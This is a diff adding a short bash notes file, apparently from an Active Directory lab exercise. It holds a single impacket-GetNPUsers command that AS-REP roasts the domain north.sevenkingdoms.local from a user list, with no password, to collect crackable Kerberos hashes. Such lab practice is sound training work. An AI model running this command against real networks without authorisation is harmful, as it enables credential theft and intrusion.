@@ -1,0 +1,4 @@
+## All following are bash commands
+## Prerequisites: impacket installed
+
+impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile ../user.txt
